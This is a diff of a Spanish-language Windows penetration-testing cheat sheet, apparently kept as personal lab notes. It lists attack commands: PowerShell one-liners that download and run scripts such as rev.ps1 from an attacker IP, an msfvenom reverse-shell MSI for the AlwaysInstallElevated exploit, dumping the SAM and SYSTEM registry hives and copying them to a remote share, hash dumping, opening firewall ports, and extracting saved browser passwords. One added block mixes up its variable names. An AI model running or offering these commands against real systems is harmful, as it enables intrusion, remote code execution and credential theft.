@@ -30,13 +30,20 @@ IEX(New-Object Net.WebClient).downloadString('http://10.11.41.181:8000/powerup.p
 C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.11.41.181:8000/rev.ps1')
 powershell.exe -ep -Bypass -nop -noexit -c IEX"(New-Object Net.WebClient).downloadstring('http://ip/file')
 powershell.exe -c "(New-Object System.Net.Webclient).DownloadFile('http://ip/file', 'c:\Users\user\file')"
-Invoke-WebRequest "http://ip/file" -OutFile "c:\Users\file"
+Invoke-WebRequest -Uri $url -OutFile $dest
 certutil.exe -f -urlcache -split http://ip/file file
 wget URL -UseBasicParsing -OutFile FILE
+Start-BitsTransfer -Source $url -Destination $dest 
 
-# copiar archivos via compartida
-copy \\IP\SHARE\FILE FILE
+# copiar archivos desde compartida
 c:\tmp>copy \\10.11.14.106\smbfolder\winPEAS.exe winPEAS.exe
+
+# copiar archivos desde compartida 
+$origen = "\\LA-WIN10-LAB01\speedtest\"
+$destino = "c:\temp\testfiles"
+
+# copiar todos los archivos de la compartida 
+Copy-Item -path $source -Destination $destination -Recurse
 
 # Firewall rules en Windows
 netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=in localport=PORT action=allow
@@ -50,13 +57,12 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnec
 # SAM Crack 
 reg save HKLM\SAM sam.backup
 reg save HKLM\SYSTEM system.backup
--
+
 copy sam.backup \\IP\smbfolder\sam
 copy system.backup \\IP\smbfolder\system
--
+
 pwdump system sam --> lista los hashes de las contraseñas
 
-----
 # AlwaysInstallElevated exploit
 # consultar el estado 
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -64,7 +70,6 @@ reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v Alw
 
 # payload
 msfvenom -p windows/shell/reverse_tcp LHOST=ip LPORT=port -f msi -o payload.msi
-----
 
 # CMD
 tasklist
@@ -98,8 +103,6 @@ python windows-exploit-suggester.py -i systeminfo -d 2021-10-04-mssb.xls --ostex
 net localgroup Administrators --> lista los miembros del grupo Administrators
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --> consulta los programas en autorun
 icacls.exe c:\\windows\system32\SecurityHealthSystray.exe --> muestra los permisos de ejecución de un ejecutable
-
-----
 
 # Muestra el propietario de un archivo/carpeta
 get-acl C:\
@@ -159,14 +162,13 @@ net use \\10.16.22.245\SCANNERDOC PASS /user:USER
 net use U: \\10.16.22.245\SCANNERDOC * /user:USER /persistent:no
 copy \\10.21.7.187\SHARE\winPEASx64.exe .
 
-
 # colores en winPEAS:
 REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 
 # WebBrowserPassView
 WebBrowserPassView.exe /UseChromeProfileFolder 1 /ChromeProfileFolder "C:\Users\User\AppData\Local\Google\Chrome\User Data"
 
-# crear objeto usuario en pwsh
+# crear objeto usuario/pass
 $SecPass = ConvertTo-SecureString 'PASS' -AsPlainText -Force
-$cred = New-Object System.Management.Automation PSCredential ('USER' ,$SecPass)
-$cred
+$creds = New-Object System.Management.Automation PSCredential ('USER' ,$SecPass)
+Invoke-WebRequest -Uri $url -OutFile $dest -Credential $creds
